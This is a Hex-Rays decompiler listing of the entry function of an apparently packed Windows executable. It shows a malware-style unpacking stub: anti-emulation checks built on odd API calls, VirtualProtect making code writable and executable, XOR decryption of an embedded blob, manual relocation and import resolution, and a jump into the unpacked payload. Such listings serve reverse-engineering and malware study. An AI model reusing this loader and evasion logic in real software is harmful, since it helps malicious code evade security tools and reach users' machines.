/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

// int __usercall start@<eax>(int a1@<ebx>, int a2@<ebp>, int a3@<edi>);
// BOOL __stdcall AreAllAccessesGranted(DWORD GrantedAccess, DWORD DesiredAccess);
// BOOL __stdcall VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// void __stdcall __noreturn ExitProcess(UINT uExitCode);
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
// HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName);
// PSTR __stdcall StrStrIA(PCSTR pszFirst, PCSTR pszSrch);
// PSTR __stdcall StrChrA(PCSTR pszStart, WORD wMatch);

//-------------------------------------------------------------------------
// Data declarations

char byte_402377[] = { '\0' }; // weak
char byte_402378[] = { '\0' }; // weak
char byte_402379[] = { '±' }; // weak
char byte_40237A[] = { '_' }; // weak
char byte_40237B[] = { '‡' }; // weak
char byte_40237C[] = { '\x12' }; // weak
char byte_40237D[] = { ')' }; // weak
_UNKNOWN loc_402B58; // weak
int dword_403678[98] =
{
  -471750001,
  -57074177,
  -1313028319,
  -429503059,
  -906086093,
  1103326469,
  247118206,
  -801334951,
  -815255863,
  -1219903101,
  -532657399,
  -861585412,
  1153525815,
  193182824,
  -719938433,
  -880530881,
  -1269972312,
  -473085830,
  -841138866,
  1170565438,
  180010351,
  -737763986,
  -996726060,
  -1153708623,
  -321698047,
  -1027460500,
  1246848653,
  73708055,
  -624323687,
  -974445452,
  -1157772044,
  -314816824,
  -1015336022,
  1263953846,
  76722974,
  -639135601,
  -964483293,
  -1186541640,
  -288537334,
  -1059770256,
  1212048424,
  134066275,
  -649555952,
  -970971234,
  -1180577996,
  -295025233,
  -1069535005,
  1236362577,
  108179964,
  -658337392,
  -944364026,
  -2089038147,
  -728207545,
  -88339956,
  1134063474,
  205962183,
  -757752897,
  -844813289,
  -2089028213,
  -728203449,
  -88339948,
  1924947538,
  1030392559,
  -471750001,
  -57074385,
  -2089028213,
  -728203449,
  -88339948,
  1924947538,
  1030392559,
  -471750001,
  -57074385,
  -2089028213,
  -728203449,
  -88339948,
  1924947538,
  1030392559,
  -471750001,
  -57074385,
  -2089028213,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0
}; // weak
char byte_405000[4096] =
{
  'Ñ',
  '¯',
  '!',
  'Ù',
  '\x1D',
  '%',
  'Â',
  'Ž',
  'N',
  'P',
  'æ',
  ' ',
  '\b',
  '\x04',
  'æ',
  '(',
  'µ',
  'Ð',
  '0',
  'g',
  'Õ',
  'ð',
  '»',
  '¹',
  'u',
  'G',
  'Ã',
  '¦',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  
}; // idb


//----- (00401000) --------------------------------------------------------
int __usercall start@<eax>(int a1@<ebx>, int a2@<ebp>, int a3@<edi>)
{
  int v3; // esi
  HMODULE v5; // eax
  BOOL (__stdcall *AddAce)(PACL, DWORD, DWORD, LPVOID, DWORD); // eax
  int v7; // edi
  int v8; // edx
  unsigned int v9; // eax
  char v10; // cl
  int v11; // esi
  char v12; // dl
  int v13; // esi
  char v14; // cl
  int v15; // esi
  char v16; // dl
  int v17; // esi
  char v18; // cl
  int v19; // esi
  char v20; // dl
  unsigned int v21; // esi
  unsigned int v22; // ebx
  char *v23; // ebp
  unsigned int v24; // ecx
  char *v25; // edi
  _WORD *v26; // edx
  char *v27; // edi
  HMODULE v28; // ecx
  int v29; // eax
  char *v30; // ebp
  int v31; // eax
  FARPROC *v32; // edi
  FARPROC v33; // eax
  int v34; // ecx
  DWORD flOldProtect; // [esp+20h] [ebp-4h] BYREF
  const CHAR *retaddr; // [esp+24h] [ebp+0h]
  unsigned int v38; // [esp+28h] [ebp+4h]
  char *v39; // [esp+28h] [ebp+4h]
  HMODULE v41; // [esp+2Ch] [ebp+8h]

  v3 = 0;
  if ( !StrChrA("StrChr", 0) && !StrStrIA("StrStrIA", 0) )
  {
    v5 = LoadLibraryA("advapi32.dll");
    AddAce = (BOOL (__stdcall *)(PACL, DWORD, DWORD, LPVOID, DWORD))GetProcAddress(v5, "AddAce");
    v7 = ((int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, int, int, int))AddAce)(0, 0, 0, 0, 0, a3, a2, a1)
       + 28;
    if ( !AreAllAccessesGranted(0xFFFFFFFF, 0xFFFFFFFF) )
      v7 ^= 0xEu;
    VirtualProtect(start, 0x3000u, 0x40u, &flOldProtect);
    v9 = 0;
    while ( 1 )
    {
      if ( v3 == v7 )
        v3 = 0;
      v10 = byte_402378[v9] ^ byte_405000[v3];
      v11 = v3 + 1;
      byte_402378[v9] = v10 ^ 0x5A;
      if ( v11 == v7 )
        v11 = 0;
      v12 = byte_402379[v9] ^ byte_405000[v11];
      v13 = v11 + 1;
      byte_402379[v9] = v12 ^ 0x5A;
      if ( v13 == v7 )
        v13 = 0;
      v14 = byte_40237A[v9] ^ byte_405000[v13];
      v15 = v13 + 1;
      byte_40237A[v9] = v14 ^ 0x5A;
      if ( v15 == v7 )
        v15 = 0;
      v16 = byte_40237B[v9] ^ byte_405000[v15];
      v17 = v15 + 1;
      byte_40237B[v9] = v16 ^ 0x5A;
      if ( v17 == v7 )
        v17 = 0;
      v18 = byte_40237C[v9] ^ byte_405000[v17];
      v19 = v17 + 1;
      byte_40237C[v9] = v18 ^ 0x5A;
      if ( v19 == v7 )
        v19 = 0;
      v20 = byte_40237D[v9] ^ byte_405000[v19];
      v9 += 6;
      LOBYTE(v8) = v20 ^ 0x5A;
      byte_402377[v9] = v8;
      v3 = v19 + 1;
      if ( v9 >= 0x1440 )
      {
        v21 = (unsigned int)dword_403678;
        v22 = a1 + v8;
        v23 = &byte_402378[-640];
        retaddr = &byte_402378[-640];
        v24 = 0;
        v25 = &byte_402378[-268436096];
        v38 = 0;
        while ( 1 )
        {
          v22 += (unsigned int)v25;
          v26 = (_WORD *)(v21 + 8);
          if ( (unsigned int)(*(_DWORD *)(v21 + 4) - 8) >> 1 )
          {
            v22 = (unsigned int)(*(_DWORD *)(v21 + 4) - 8) >> 1;
            do
            {
              if ( (*v26 & 0xF000) == 12288 )
                *(_DWORD *)&v23[*(_DWORD *)v21 + (*v26 & 0xFFF)] += v25;
              ++v26;
              --v22;
            }
            while ( v22 );
            v24 = v38;
          }
          v24 += *(_DWORD *)(v21 + 4);
          v38 = v24;
          v21 += *(_DWORD *)(v21 + 4);
          if ( v24 >= 0xE8 )
          {
            v27 = &byte_402378[2804];
            v39 = &byte_402378[2804];
            if ( *(_DWORD *)&byte_402378[2820] )
            {
              do
              {
                v28 = LoadLibraryA(&v23[*((_DWORD *)v27 + 3)]);
                v41 = v28;
                v22 *= 5;
                if ( v28 )
                {
                  v29 = *(_DWORD *)v27;
                  if ( !*(_DWORD *)v27 )
                    v29 = *((_DWORD *)v27 + 4);
                  v30 = &v23[v29];
                  v21 = v22 + 8 * v21;
                  v31 = *(_DWORD *)v30;
                  v32 = (FARPROC *)&retaddr[*((_DWORD *)v27 + 4)];
                  if ( *(_DWORD *)v30 )
                  {
                    while ( 1 )
                    {
                      if ( v31 >= 0 )
                      {
                        v21 *= 9;
                        v33 = GetProcAddress(v28, &retaddr[v31 + 2]);
                      }
                      else
                      {
                        v33 = GetProcAddress(v28, (LPCSTR)*(unsigned __int16 *)v30);
                        v22 += v34;
                      }
                      v30 += 4;
                      *v32 = v33;
                      v31 = *(_DWORD *)v30;
                      ++v32;
                      if ( !*(_DWORD *)v30 )
                        break;
                      v28 = v41;
                    }
                  }
                  v23 = (char *)retaddr;
                  v27 = v39;
                }
                v27 += 20;
                v39 = v27;
              }
              while ( *((_DWORD *)v27 + 4) );
            }
            ((void (*)(void))loc_402B58)();
            ExitProcess(0);
          }
        }
      }
    }
  }
  return 0;
}
// 40114C: variable 'v8' is possibly undefined
// 40122B: variable 'v34' is possibly undefined
// 403678: using guessed type int dword_403678[98];

// nfuncs=1 queued=1 decompiled=1 lumina nreq=0 worse=0 better=0
// ALL OK, 1 function(s) have been successfully decompiled
